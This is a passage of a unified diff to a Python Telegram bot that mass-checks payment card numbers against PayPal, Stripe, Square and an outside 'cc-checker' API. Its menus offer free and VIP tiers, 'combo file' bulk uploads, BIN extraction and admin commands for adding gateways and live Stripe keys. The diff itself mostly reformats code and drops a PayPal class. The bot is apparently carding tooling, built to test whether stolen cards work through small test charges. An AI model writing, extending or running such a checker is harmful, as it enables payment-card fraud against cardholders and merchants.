             return f"Error: {e}"
 
-# ===================== END PAYPAL COMMERCE CLASS =====================
+# ═══════════════════════ Check Card API ═══════════════════════
 
 async def check_card_api(card_full, gateway_url):
     async with api_semaphore:
@@ -833,7 +652,7 @@ async def check_card_api(card_full, gateway_url):
             result_raw = await loop.run_in_executor(None, run_check)
             result = str(result_raw)
             result_lower = result.lower()
-            
+
             if result.startswith("CHARGE"):
                 return "approved", result_raw
             elif "insufficient" in result_lower:
@@ -845,9 +664,10 @@ async def check_card_api(card_full, gateway_url):
                     return "declined", result
                 else:
                     return "declined", "Declined"
-                    
         except Exception as e:
             return "declined", f"Error: {e}"
+
+# ═══════════════════════ Stripe Check ═══════════════════════
 
 def check_stripe_sync(card, key_id="1"):
     try:
@@ -913,13 +733,13 @@ def check_stripe_sync(card, key_id="1"):
         except:
             pass
 
+# ═══════════════════════ Square Check ═══════════════════════
+
 def classify_square_error(msg):
     msg_lower = str(msg).lower()
     if 'insufficient' in msg_lower:
         return 'LIVE'
-    elif 'declined' in msg_lower:
-        return 'DECLINED'
-    elif 'pan_failure' in msg_lower:
+    elif 'declined' in msg_lower or 'pan_failure' in msg_lower:
         return 'DECLINED'
     elif 'cvv' in msg_lower or 'security code' in msg_lower:
         return 'DECLINED'
@@ -1044,17 +864,17 @@ def check_square_sync(card):
     finally:
         session.close()
 
+# ═══════════════════════ Auth Check ═══════════════════════
+
 def check_auth_sync(card):
     try:
         session = requests.Session()
         session.verify = False
         data = MultipartEncoder({'data': (None, card),})
         headers = {
-            'authority': 'uncoder.eu.org',
-            'accept': '*/*',
+            'authority': 'uncoder.eu.org', 'accept': '*/*',
             'accept-language': 'ar-CA,ar;q=0.9,en-CA;q=0.8,en;q=0.7,en-US;q=0.6',
-            'content-type': data.content_type,
-            'origin': 'https://uncoder.eu.org',
+            'content-type': data.content_type, 'origin': 'https://uncoder.eu.org',
             'referer': 'https://uncoder.eu.org/cc-checker/',
             'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
         }
@@ -1062,11 +882,9 @@ def check_auth_sync(card):
         response = session.post('https://uncoder.eu.org/cc-checker/api.php', headers=headers, data=data)
         end_time = time.time()
         taken = round(end_time - start_time, 2)
-        
         try:
             json_data = response.json()
             message = json_data.get('message', '')
-            
             if 'approved' in message.lower():
                 return {'status': 'approved', 'message': 'Approved — $0 auth', 'taken': taken}
             elif 'insufficient' in message.lower():
@@ -1083,7 +901,7 @@ def check_auth_sync(card):
         except:
             pass
 
-# ============ لوحة الأزرار ============
+# ═══════════════════════ لوحة الأزرار ═══════════════════════
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
@@ -1093,50 +911,21 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         [InlineKeyboardButton("🤖 Free Commands", callback_data="free_cmds")],
         [InlineKeyboardButton("💎 VIP Commands", callback_data="vip_cmds")],
         [InlineKeyboardButton("👑 Admin Commands", callback_data="admin_cmds")],
-        [
-            InlineKeyboardButton("💳 Check", callback_data="check_panel"),
-            InlineKeyboardButton("📊 Stats", callback_data="stats_panel"),
-        ],
+        [InlineKeyboardButton("💳 Check", callback_data="check_panel"), InlineKeyboardButton("📊 Stats", callback_data="stats_panel")],
     ]
-    await update.message.reply_text(
-        premium_emoji(f"""🔥 Welcome! @{username} 🔥
-- - - - - - - - - - - - - - - - - - - - - -
-🔥 Bot Status: Online 🚀"""),
-        parse_mode="HTML",
-        reply_markup=InlineKeyboardMarkup(keyboard)
-    )
+    await update.message.reply_text(premium_emoji(f"🔥 Welcome! @{username} 🔥\n- - - - - - - - - - - - - - - - - - - - - -\n🔥 Bot Status: Online 🚀"), parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard))
 
 async def free_cmds_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
     keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_to_start")]]
-    await query.edit_message_text(
-        premium_emoji("""🤖 FREE COMMANDS:
-• /start - Start
-• /cmds - Commands
-• /pp [card] - PayPal single
-• /st [card] - Stripe single
-• /sq [card] - Square single
-• /auth [card] - Auth $0 check
-• /stop - Stop mass
-• /code [key] - Activate VIP"""),
-        parse_mode="HTML",
-        reply_markup=InlineKeyboardMarkup(keyboard)
-    )
+    await query.edit_message_text(premium_emoji("🤖 FREE COMMANDS:\n• /start - Start\n• /cmds - Commands\n• /pp [card] - PayPal single\n• /st [card] - Stripe single\n• /sq [card] - Square single\n• /auth [card] - Auth $0 check\n• /stop - Stop mass\n• /code [key] - Activate VIP"), parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard))
 
 async def vip_cmds_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
     keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_to_start")]]
-    await query.edit_message_text(
-        premium_emoji("""💎 VIP COMMANDS:
-• Upload combo file - Mass checking
-• /st [card] - Stripe single
-• /sq [card] - Square single
-• /auth [card] - Auth $0 check"""),
-        parse_mode="HTML",
-        reply_markup=InlineKeyboardMarkup(keyboard)
-    )
+    await query.edit_message_text(premium_emoji("💎 VIP COMMANDS:\n• Upload combo file - Mass checking\n• /st [card] - Stripe single\n• /sq [card] - Square single\n• /auth [card] - Auth $0 check"), parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard))
 
 async def admin_cmds_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
@@ -1146,22 +935,7 @@ async def admin_cmds_callback(update: Update, context: ContextTypes.DEFAULT_TYPE
         await query.answer("Admin only!", show_alert=True)
         return
     keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_to_start")]]
-    await query.edit_message_text(
-        premium_emoji("""👑 ADMIN COMMANDS:
-• /add [url] - Add gateway
-• /rmadd [num] - Remove gateway
-• /show_gateways - Show gateways
-• /ban_user [id] - Ban user
-• /unban_user [id] - Unban user
-• /prm [id] [days] - Add VIP
-• /rmprm [id] - Remove VIP
-• /addkey [pk] [sk] - Add Stripe key
-• /rmkey [id] - Remove Stripe key
-• /wafa [days] [max] - Generate codes
-• /SENT [msg] - Broadcast"""),
-        parse_mode="HTML",
-        reply_markup=InlineKeyboardMarkup(keyboard)
-    )
+    await query.edit_message_text(premium_emoji("👑 ADMIN COMMANDS:\n• /add [url] - Add gateway\n• /rmadd [num] - Remove gateway\n• /show_gateways - Show gateways\n• /ban_user [id] - Ban user\n• /unban_user [id] - Unban user\n• /prm [id] [days] - Add VIP\n• /rmprm [id] - Remove VIP\n• /addkey [pk] [sk] - Add Stripe key\n• /rmkey [id] - Remove Stripe key\n• /wafa [days] [max] - Generate codes\n• /SENT [msg] - Broadcast"), parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard))
 
 async def check_panel_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
@@ -1173,11 +947,7 @@ async def check_panel_callback(update: Update, context: ContextTypes.DEFAULT_TYP
         [InlineKeyboardButton("🛡 Auth $0", callback_data="check_auth")],
         [InlineKeyboardButton("🔙 Back", callback_data="back_to_start")],
     ]
-    await query.edit_message_text(
-        premium_emoji("💳 Choose check type:"),
-        parse_mode="HTML",
-        reply_markup=InlineKeyboardMarkup(keyboard)
-    )
+    await query.edit_message_text(premium_emoji("💳 Choose check type:"), parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard))
 
 async def check_paypal_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
@@ -1203,14 +973,7 @@ async def stats_panel_callback(update: Update, context: ContextTypes.DEFAULT_TYP
     query = update.callback_query
     await query.answer()
     keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_to_start")]]
-    await query.edit_message_text(
-        premium_emoji(f"""📊 STATS:
-👥 Users: {len(ALL_USERS)}
-🌐 Gateways: {len(GATEWAYS)}
-🔑 Stripe Keys: {len(STRIPE_KEYS)}"""),
-        parse_mode="HTML",
-        reply_markup=InlineKeyboardMarkup(keyboard)
-    )
+    await query.edit_message_text(premium_emoji(f"📊 STATS:\n👥 Users: {len(ALL_USERS)}\n🌐 Gateways: {len(GATEWAYS)}\n🔑 Stripe Keys: {len(STRIPE_KEYS)}"), parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard))
 
 async def back_to_start_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
@@ -1221,20 +984,11 @@ async def back_to_start_callback(update: Update, context: ContextTypes.DEFAULT_T
         [InlineKeyboardButton("🤖 Free Commands", callback_data="free_cmds")],
         [InlineKeyboardButton("💎 VIP Commands", callback_data="vip_cmds")],
         [InlineKeyboardButton("👑 Admin Commands", callback_data="admin_cmds")],
-        [
-            InlineKeyboardButton("💳 Check", callback_data="check_panel"),
-            InlineKeyboardButton("📊 Stats", callback_data="stats_panel"),
-        ],
+        [InlineKeyboardButton("💳 Check", callback_data="check_panel"), InlineKeyboardButton("📊 Stats", callback_data="stats_panel")],
     ]
-    await query.edit_message_text(
-        premium_emoji(f"""🔥 Welcome! @{username} 🔥
-- - - - - - - - - - - - - - - - - - - - - -
-🔥 Bot Status: Online 🚀"""),
-        parse_mode="HTML",
-        reply_markup=InlineKeyboardMarkup(keyboard)
-    )
+    await query.edit_message_text(premium_emoji(f"🔥 Welcome! @{username} 🔥\n- - - - - - - - - - - - - - - - - - - - - -\n🔥 Bot Status: Online 🚀"), parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard))
 
-# ============ لوحة البوابات ============
+# ═══════════════════════ لوحة البوابات ═══════════════════════
 
 async def show_gateways(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id not in ADMINS:
@@ -1246,11 +1000,7 @@ async def show_gateways(update: Update, context: ContextTypes.DEFAULT_TYPE):
     for i, gateway in enumerate(GATEWAYS, 1):
         keyboard.append([InlineKeyboardButton(f"🌐 Gate #{i}", callback_data=f"gate_info_{i}")])
     keyboard.append([InlineKeyboardButton("🔙 Close", callback_data="close_gateways")])
-    await update.message.reply_text(
-        premium_emoji(f"🌐 <b>Gateways ({len(GATEWAYS)}):</b>\n\nChoose a gateway to manage:"),
-        parse_mode="HTML",
-        reply_markup=InlineKeyboardMarkup(keyboard)
-    )
+    await update.message.reply_text(premium_emoji(f"🌐 <b>Gateways ({len(GATEWAYS)}):</b>\n\nChoose a gateway to manage:"), parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard))
 
 async def gate_info_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
@@ -1265,11 +1015,7 @@ async def gate_info_callback(update: Update, context: ContextTypes.DEFAULT_TYPE)
             [InlineKeyboardButton("🗑 Remove", callback_data=f"gate_remove_{gate_num}")],
             [InlineKeyboardButton("🔙 Back", callback_data="back_to_gateways")],
         ]
-        await query.edit_message_text(
-            premium_emoji(f"🌐 <b>Gateway #{gate_num}:</b>\n<code>{gateway_url}</code>\n\nChoose action:"),
-            parse_mode="HTML",
-            reply_markup=InlineKeyboardMarkup(keyboard)
-        )
+        await query.edit_message_text(premium_emoji(f"🌐 <b>Gateway #{gate_num}:</b>\n<code>{gateway_url}</code>\n\nChoose action:"), parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard))
 
 async def gate_remove_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
@@ -1284,11 +1030,7 @@ async def gate_remove_callback(update: Update, context: ContextTypes.DEFAULT_TYP
         for i, gateway in enumerate(GATEWAYS, 1):
             keyboard.append([InlineKeyboardButton(f"🌐 Gate #{i}", callback_data=f"gate_info_{i}")])
         keyboard.append([InlineKeyboardButton("🔙 Close", callback_data="close_gateways")])
-        await query.edit_message_text(
-            premium_emoji(f"🗑 <b>Gateway #{gate_num} removed!</b>\n\n🌐 <b>Remaining ({len(GATEWAYS)}):</b>"),
-            parse_mode="HTML",
-            reply_markup=InlineKeyboardMarkup(keyboard)
-        )
+        await query.edit_message_text(premium_emoji(f"🗑 <b>Gateway #{gate_num} removed!</b>\n\n🌐 <b>Remaining ({len(GATEWAYS)}):</b>"), parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard))
 
 async def back_to_gateways_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
@@ -1300,18 +1042,14 @@ async def back_to_gateways_callback(update: Update, context: ContextTypes.DEFAUL
     for i, gateway in enumerate(GATEWAYS, 1):
         keyboard.append([InlineKeyboardButton(f"🌐 Gate #{i}", callback_data=f"gate_info_{i}")])
     keyboard.append([InlineKeyboardButton("🔙 Close", callback_data="close_gateways")])
-    await query.edit_message_text(
-        premium_emoji(f"🌐 <b>Gateways ({len(GATEWAYS)}):</b>\n\nChoose a gateway to manage:"),
-        parse_mode="HTML",
-        reply_markup=InlineKeyboardMarkup(keyboard)
-    )
+    await query.edit_message_text(premium_emoji(f"🌐 <b>Gateways ({len(GATEWAYS)}):</b>\n\nChoose a gateway to manage:"), parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard))
 
 async def close_gateways_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
     await query.delete_message()
 
-# ============ أوامر ============
+# ═══════════════════════ أوامر ═══════════════════════
 
 async def cmds(update: Update, context: ContextTypes.DEFAULT_TYPE):
     commands_text = """🤵 ADMIN:
@@ -1464,8 +1202,7 @@ async def remove_prm(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(premium_emoji("✅ VIP removed."), parse_mode="HTML")
 
 async def add_stripe_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if update.effective_user.id not in ADMINS:
-        return
+    if update.effective_user.id not in ADMINS: return
     args_text = " ".join(context.args)
     pk_match = re.search(r'pk_live_[a-zA-Z0-9]+', args_text)
     sk_match = re.search(r'sk_live_[a-zA-Z0-9]+', args_text)
@@ -1480,10 +1217,8 @@ async def add_stripe_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(premium_emoji(f"✅ Stripe Key Saved!\n🆔 Key ID: <code>{key_id}</code>"), parse_mode="HTML")
 
 async def remove_stripe_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if update.effective_user.id not in ADMINS:
-        return
-    if not context.args:
-        return
+    if update.effective_user.id not in ADMINS: return
+    if not context.args: return
     key_id = context.args[0]
     if key_id in STRIPE_KEYS:
         del STRIPE_KEYS[key_id]
@@ -1491,7 +1226,7 @@ async def remove_stripe_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
             json.dump(STRIPE_KEYS, f)
         await update.message.reply_text(premium_emoji(f"✅ Key {key_id} removed!"), parse_mode="HTML")
 
-# ============ دوال التنسيق ============
+# ═══════════════════════ دوال التنسيق ═══════════════════════
 
 async def format_response(card_full, status, response, taken, gateway_url, gateway_num, user_id, mode="Single"):
     bin_number = card_full.split("|")[0][:6]
@@ -1617,7 +1352,7 @@ async def format_auth_response(card_full, result_dict, taken, user_id, mode="Sin
 - - - - - - - - - - - - - - - - - - - - - -
 [⌤] Dev by: WAFA 🍀""")
 
-# ============ أوامر الفحص ============
+# ═══════════════════════ أوامر الفحص ═══════════════════════
 
 async def auth_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
@@ -1734,6 +1469,8 @@ async def gateway_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         task = asyncio.create_task(process_auth_file(file_path, chat_id, context))
     user_tasks[user_id] = task
     del pending_files[user_id]
+
+# ═══════════════════════ Process Files ═══════════════════════
 
 async def process_paypal_file(file_path, chat_id, context):
     global gateway_index
@@ -1962,6 +1699,8 @@ async def process_auth_file(file_path, chat_id, context):
         await context.bot.send_message(chat_id, premium_emoji("🛑 Stopped."), parse_mode="HTML")
     except Exception as e:
         await context.bot.send_message(chat_id, premium_emoji(f"❌ Error: {e}"), parse_mode="HTML")
+
+# ═══════════════════════ Main ═══════════════════════
 
 async def error_handler(update, context):
     pass
